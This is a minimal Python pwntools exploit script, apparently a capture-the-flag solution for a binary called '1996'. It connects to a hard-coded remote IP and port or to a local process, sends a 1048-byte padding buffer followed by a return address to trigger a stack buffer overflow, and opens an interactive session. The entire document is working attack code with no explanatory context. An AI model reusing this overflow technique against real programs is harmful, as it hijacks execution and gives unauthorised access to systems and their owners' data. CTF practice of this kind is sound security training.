from pwn import *

if len(sys.argv) > 1 and sys.argv[1] == '-r':
    c = remote('35.207.132.47', 22227)
else:
    c = process('./1996')

buf = "A"*1048
buf += p64(0x400897)
c.sendline(buf)
c.interactive()
